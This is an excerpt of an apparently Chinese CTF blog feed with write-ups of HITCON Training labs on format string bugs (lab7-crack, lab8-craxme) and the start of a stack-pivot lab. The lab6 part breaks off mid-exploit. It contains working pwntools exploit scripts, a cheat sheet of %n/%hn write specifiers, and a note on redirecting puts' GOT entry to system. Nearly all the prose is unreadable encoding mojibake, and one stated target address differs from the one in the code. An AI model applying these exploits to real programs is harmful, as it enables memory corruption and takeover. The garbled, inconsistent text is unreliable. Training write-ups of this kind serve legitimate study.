      <url>/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà26-Hitcon-Âõõ"><a href="#Pwn-10Êúà26-Hitcon-Âõõ" class="headerlink" title="Pwn-10Êúà26-Hitcon-Âõõ"></a>Pwn-10Êúà26-Hitcon-Âõõ</h1><blockquote><p>ÁªÉ‰π†HitconÁöÑÁ¨¨ÂõõÂ§©üê∑ÔºåÊÑâÂø´Âú∞Â≠¶‰π†fsbÔºàFormat string bugÔºâÔºåÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û„ÄÇ</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>Â•ΩüëçÔºåËøôÈ¢òÂºÄÂßãÊé•Ëß¶Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û„ÄÇ</p><p>‰ªÄ‰πàÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºüÊàë‰ª¨Áü•ÈÅìc/c++‰∏≠<code>printf</code>ÂáΩÊï∞ËæìÂá∫ÂÄºÈúÄË¶ÅÂØπÂ∫îÁöÑÂèÇÊï∞Ôºå‰ΩÜÂΩìÊèê‰æõÁöÑÂèÇÊï∞Âá∫Áé∞ÈóÆÈ¢òÔºåÊàñËÄÖÊ≤°ÊúâÊèê‰æõÂèÇÊï∞ÁöÑÊó∂ÂÄôÔºåÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂ∞±ÂèØËÉΩÂá∫Áé∞‰∫Ü„ÄÇ<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wiki‰º†ÈÄÅÈó®</a></p><p>ÈÇ£‰πàÂÅáËÆæÔºåÊ≠§Êó∂Êàë‰ª¨Âú®ÁºñÂÜôÁ®ãÂ∫èÊó∂ÂÄôÔºåÂÜôÊàê‰∫Ü‰∏ãÈù¢ÁöÑÊ†∑Â≠ê</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>Ê≠§Êó∂Êàë‰ª¨ÂèØ‰ª•ÂèëÁé∞Êàë‰ª¨Âπ∂Ê≤°ÊúâÊèê‰æõÂèÇÊï∞ÔºåÈÇ£‰πàÁ®ãÂ∫è‰ºöÂ¶Ç‰ΩïËøêË°åÂë¢ÔºüÁ®ãÂ∫èÁÖßÊ†∑‰ºöËøêË°åÔºå‰ºöÂ∞ÜÊ†à‰∏äÂ≠òÂÇ®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Âú∞ÂùÄ‰∏äÈù¢ÁöÑ‰∏â‰∏™ÂèòÈáèÂàÜÂà´Ëß£Êûê‰∏∫</p><ol><li><strong>Ëß£ÊûêÂÖ∂Âú∞ÂùÄÂØπÂ∫îÁöÑÂ≠óÁ¨¶‰∏≤</strong></li><li>Ëß£ÊûêÂÖ∂ÂÜÖÂÆπÂØπÂ∫îÁöÑÊï¥ÂΩ¢ÂÄº</li><li>Ëß£ÊûêÂÖ∂ÂÜÖÂÆπÂØπÂ∫îÁöÑÊµÆÁÇπÂÄº</li></ol><p>Áî±Ê≠§ÂèØËßÅ<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û</a>‰∏ªË¶ÅÊòØÔºö</p><ul><li><p><strong>1.Ê≥ÑÊºè‰ªªÊÑèÂú∞ÂùÄÁöÑÂÄºÔºåleakÂÜÖÂ≠òÔºàÊØîÂ¶ÇleakÂá∫libcÂü∫Âú∞ÂùÄÔºâ</strong></p></li><li><p><strong>2.ÂÜô‰ªªÊÑèÂú∞ÂùÄÔºåÂèØÁî®‰∫é‰øÆÊîπgotË°®</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">ËøôÈÉ®ÂàÜÊù•Ëá™icemakrÁöÑÂçöÂÆ¢ <span class="token operator">==</span><span class="token operator">></span>ÂêëÂ§ß‰Ω¨Ëá¥Êï¨32‰ΩçËØª<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // ËØª4‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // Âêå‰∏äÈù¢<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>ÂÜô<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•Âõõ‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•‰∏§‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•‰∏Ä‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•ÂÖ´‰∏™Â≠óËäÇ64‰ΩçËØª<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // ËØª4‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // ËØª8‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // ËØª8‰∏™Â≠óËäÇ<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>ÂÜô<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•Âõõ‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•‰∏§‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•‰∏Ä‰∏™Â≠óËäÇ<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // Ëß£ÂºïÁî®ÔºåÂÜôÂÖ•ÂÖ´‰∏™Â≠óËäÇ%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> Ê†à‰∏äÁöÑÁ¨¨‰∏Ä‰∏™QWORD</code></pre><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p>ÊåâÂ•óË∑ØÊù•ÔºåÂÖà<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÂºÄÂêØ‰∫ÜÊ†àÊ∫¢Âá∫‰øùÊä§(canary found)Ôºå‰ª•ÂèäÊ†à‰∏çÂèØÊâßË°å(NX)Êé™ÊñΩÔºåÂæàÊòéÊòæËÆ©Êàë‰ª¨‰ªéÂà´Â§ÑÂÖ•Êâã„ÄÇ</p><p>ÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÔºö</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>Êàë‰ª¨ÈúÄË¶ÅËæìÂÖ•‰∏§‰∏™ÂÄºÔºå‰∏Ä‰∏™ÊòØnameÔºåËæìÂÖ•‰πãÂêé‰ºöË¢´ÊâìÂç∞Ôºå‰∏Ä‰∏™ÊòØpassword„ÄÇ</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4xÂ∏àÂÇÖ</a>ÁöÑÈÄªËæëÔºö<code>ËæìÂá∫ name Êó∂ÊúâÊòéÊòæÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåËøô‰∏™È¢òÁöÑÊÄùË∑ØÊúâÂæàÂ§öÔºåÂèØ‰ª•Âà©Áî® fsb ÊîπÂÜô passwordÔºåÊàñËÄÖ leak Âá∫ passwordÔºå‰πüÂèØ‰ª•Áõ¥Êé•ÈÄöËøá fsbÔºåhijack puts_got Âà∞ system(‚Äúcat flag‚Äù) Â§ÑÔºàÊ≥®ÊÑèËøôÈáå printf ÂÆûÈôÖË∞ÉÁî®‰∫Ü putsÔºâ</code>„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>idaproÂêØÂä®ÔºÅÔºÅÂêØÂä®ÔºÅÔºÅÁªôÊàëÂêØÂä®ÂïäÔºÅÔºÅüôÉÔºÅmainÂáΩÊï∞Ôºö</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1ÔºöÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤password"><a href="#exp1ÔºöÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤password" class="headerlink" title="exp1ÔºöÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤password"></a>exp1ÔºöÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>ÁÆÄÂçïÊµãËØï‰∏Ä‰∏ãÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∫õÊúâË∂£ÁöÑ‰∏úË•øÔºåËøô‰∫õÂ∫îËØ•ÊòØ<code>printf</code>Ê†à‰∏≠ÁöÑÊï∞ÊçÆÔºåÈÇ£‰πàÊàë‰ª¨Âè™Ë¶ÅÊâæÂà∞Ê†à‰∏≠Â≠òÂÇ®Êàë‰ª¨ËæìÂÖ•ÁöÑÂÜÖÂÆπÁöÑ‰ΩçÁΩÆÔºåÂÅáÂ¶ÇËæìÂÖ•ÁöÑÊòØÊüêÂú∞ÂùÄÔºåÂÜçÁî®%sËß£ÊûêÂ∞±ÂèØËé∑ÂæóËØ•Âú∞ÂùÄ‰∏ãÁöÑÂÜÖÂÆπÔºö</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞ËæìÂÖ•ÁöÑÂÜÖÂÆπÂú®Ê†à‰∏≠ÁöÑÁ¨¨ÂçÅ‰∏™‰ΩçÁΩÆÔºåËá≥‰∫é‰∏∫‰ªÄ‰πàÂú®gdbÁúãÊ†à‰∏≠Êï∞ÊçÆÂú®Á¨¨ÂçÅ‰∏Ä‰∏™‰ΩçÁΩÆÔºåÊòØÂõ†‰∏∫‚ÄùHello ,‚ÄùËøòÊ≤°ÊúâË¢´ËæìÂá∫ÔºåÂæÖÂÖ∂ËæìÂá∫ÂêéÊàë‰ª¨ÁöÑËæìÂÖ•Â∞±Êù•Âà∞‰∫ÜÁ¨¨ÂçÅ‰∏™‰ΩçÁΩÆ„ÄÇ</p><p>ËøôÈáåÂ≠¶Âà∞‰∏Ä‰∏™Â∞èÁü•ËØÜÔºå<code>%10$s</code>‰∏≠Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑ‚Äú$‚ÄùÊìç‰ΩúÁ¨¶ÔºåÂÖ∂ÂÖÅËÆ∏Êàë‰ª¨‰ªéÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰∏≠ÈÄâÂèñ‰∏Ä‰∏™‰ΩçÁΩÆÁöÑÂèÇÊï∞‰Ωú‰∏∫ÁâπÂÆöÁöÑÂèÇÊï∞„ÄÇÊàë‰ª¨ÂèØ‰ª•‰ªéIDA‰∏≠ÂæóÂà∞<code>password_addr=0x804A080</code>ÔºåÁÑ∂ÂêéÊûÑÈÄ†EXP„ÄÇ</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True Ë°®Á§∫‰∏¢ÂºÉpatternÔºå‰∏çÊé•Âèópattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" class="lazyload"></p><h4 id="exp2Ôºö‰øÆÊîπÈöèÊú∫Êï∞"><a href="#exp2Ôºö‰øÆÊîπÈöèÊú∫Êï∞" class="headerlink" title="exp2Ôºö‰øÆÊîπÈöèÊú∫Êï∞"></a>exp2Ôºö‰øÆÊîπÈöèÊú∫Êï∞</h4><blockquote><p>ÁÆÄÂçï‰∫ÜËß£fmtstr‰πãÂêéÔºåÁü•ÈÅìÂéüÊù•ËøòÊúâËøô‰πàÈ™öÁöÑpwntoolsÊ®°ÂùóÔºåËøôÈáåÁÆÄÂçïÂØπËøô‰∏™expÂÅö‰∏™ÂàÜÊûêÁêÜËß£„ÄÇ</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Êù•Ëá™Veritas501Â§ß‰Ω¨ÁöÑexp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>fmt_len <span class="token operator">=</span> <span class="token number">10</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûú:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" class="lazyload"></p><h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote><p>Ëøô‰πüÊòØ‰∏ÄÈ¢òÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûüòÑÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáÁ±ª‰ºº‰∏äÈù¢È¢òexp2ÁöÑÊñπÂºèÊù•‰øÆÊîπÂÄºËææÂà∞ÁõÆÁöÑ„ÄÇ</p></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec craxme</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Âá†‰πéÊâÄÊúâ‰øùÊä§Êé™ÊñΩÈÉΩÊâìÂºÄÔºåÊó†Ê≥ïÈÄöËøáÊ†àÊ∫¢Âá∫ÊàñËÄÖÊ†àÊâßË°åÁ≠âÊºèÊ¥ûËøõË°åÊîªÂáª„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê-1"><a href="#ÈÄªËæëÂàÜÊûê-1" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ÂÉèlab7‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®idaÈáåÈù¢ÁúãÂà∞ÊúâÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" class="lazyload"></p><p>Êàë‰ª¨ÂèØ‰ª•ËøêË°å‰∏Ä‰∏ãËØïËØï</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Âú®printfÂáΩÊï∞Ê†à‰∏≠Á¨¨‰∏É‰∏™‰ΩçÁΩÆÊòØÊàë‰ª¨ËæìÂÖ•ÁöÑÂÜÖÂÆπÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØÂà©Áî®pwntoolsÁöÑfmtstr_payloadÊù•ÊîπÂèòmagicÁöÑÂÄº„ÄÇ</p><p>ÈÄöËøáidaÊâæÂà∞magicÁöÑÂú∞ÂùÄÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" class="lazyload"></p><p>ÈÄöËøáPwntools.ELF:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" class="lazyload"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" class="lazyload"></p><blockquote><p>‰ªäÂ§©ÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂ∞±Â≠¶Âà∞ËøôÂÑøÂï¶ÔºåÈöæÂèóüò≠„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà25-Hitcon(‰∏â)</title>
      <link href="/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/"/>
      <url>/2018/10/25/Pwn-10%E6%9C%8825-Hitcon-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà25-Hitcon-‰∏â"><a href="#Pwn-10Êúà25-Hitcon-‰∏â" class="headerlink" title="Pwn-10Êúà25-Hitcon(‰∏â)"></a>Pwn-10Êúà25-Hitcon(‰∏â)</h1><blockquote><p>‰∏ÄÂ§©‰∏ÄÂ§©ÊÖ¢ÊÖ¢Êù•Ôºåüò≠</p></blockquote><h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote><p>Ëøô‰∏™È¢òÁõÆÊ∂âÂèäÂà∞Ê†àËøÅÁßª(stack-pivot)ÔºåÂú®<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>‰∏äÈù¢ÊòØÊúâËøô‰∏™‰æãÈ¢òÂíåËß£ÈáäÁöÑ„ÄÇ</p><blockquote><p>ËØ•ÊäÄÂ∑ßÂ∞±ÊòØÂä´ÊåÅÊ†àÊåáÈíàÊåáÂêëÊîªÂáªËÄÖÊâÄËÉΩÊéßÂà∂ÁöÑÂÜÖÂ≠òÂ§ÑÔºåÁÑ∂ÂêéÂÜçÂú®Áõ∏Â∫îÁöÑ‰ΩçÁΩÆËøõË°å ROP„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÊàë‰ª¨ÂèØËÉΩÂú®‰ª•‰∏ãÊÉÖÂÜµÈúÄË¶Å‰ΩøÁî® stack pivoting</p><ul><li>ÂèØ‰ª•ÊéßÂà∂ÁöÑÊ†àÊ∫¢Âá∫ÁöÑÂ≠óËäÇÊï∞ËæÉÂ∞ëÔºåÈöæ‰ª•ÊûÑÈÄ†ËæÉÈïøÁöÑ ROP Èìæ</li><li>ÂºÄÂêØ‰∫Ü PIE ‰øùÊä§ÔºåÊ†àÂú∞ÂùÄÊú™Áü•ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÊ†àÂä´ÊåÅÂà∞Â∑≤Áü•ÁöÑÂå∫Âüü„ÄÇ</li><li>ÂÖ∂ÂÆÉÊºèÊ¥ûÈöæ‰ª•Âà©Áî®ÔºåÊàë‰ª¨ÈúÄË¶ÅËøõË°åËΩ¨Êç¢ÔºåÊØîÂ¶ÇËØ¥Â∞ÜÊ†àÂä´ÊåÅÂà∞Â†ÜÁ©∫Èó¥Ôºå‰ªéËÄåÂú®Â†Ü‰∏äÂÜô rop ÂèäËøõË°åÂ†ÜÊºèÊ¥ûÂà©Áî®</li></ul><p>Ê≠§Â§ñÔºåÂà©Áî® stack pivoting Êúâ‰ª•‰∏ãÂá†‰∏™Ë¶ÅÊ±Ç:</p><ul><li>ÂèØ‰ª•ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ„ÄÇ</li><li>ÂèØ‰ª•ÊéßÂà∂ sp ÊåáÈíà„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÊéßÂà∂Ê†àÊåáÈíà‰ºö‰ΩøÁî® ROPÔºåÂ∏∏ËßÅÁöÑÊéßÂà∂Ê†àÊåáÈíàÁöÑ gadgets ‰∏ÄËà¨ÊòØ</li></ul><pre class=" language-assembly"><code class="language-assembly">pop rsp/esp</code></pre></blockquote><p>Âú®ËøôÈ¢ò‰∏≠ÔºåÊ∫¢Âá∫ÈïøÂ∫¶‰∏çÂ§üÂØºËá¥Êó†Ê≥ï‰∏ÄÊ¨°ÊÄßÊûÑÈÄ†ropchainÔºåÂπ∂‰∏îËøòÈôêÂà∂‰∫ÜmainÂáΩÊï∞Ê∫¢Âá∫ÁöÑÊ¨°Êï∞„ÄÇ</p></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec migration</code></p><p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p><p>ÂºÄÂêØ‰∫ÜNX„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ida ÈáåÈù¢Áúã‰∏ÄÁúãÔºö</p><p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p><p>bufÂ§ßÂ∞è‰∏∫0x28 = 40Â≠óËäÇÔºåËÄåreadËØªÂèñ0x40 = 64Â≠óËäÇ</p><p>gdbË∑ë‰∏Ä‰∏ãÔºåÁúãÁúãÂÖ∑‰ΩìÊÉÖÂÜµÔºö</p><p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p><p>‰πüÂ∞±ÊòØËØ¥Êúâ4‰∏™Â≠óËäÇË¢´ËØªÂèñÂà∞EBP‰∏≠ÔºåÂâ©‰∏ã20‰∏™Ê∫¢Âá∫Â≠óËäÇÂèØ‰ª•Áî®Êù•ÊûÑÈÄ†ropchain„ÄÇ</p><p>ÊêúÁ¥¢‰∏Ä‰∏ãÂèØÁî®ÁöÑgadgetÔºö</p><p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p></blockquote><h3 id="ÊûÑÈÄ†exp"><a href="#ÊûÑÈÄ†exp" class="headerlink" title="ÊûÑÈÄ†exp"></a>ÊûÑÈÄ†exp</h3><p>expÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> 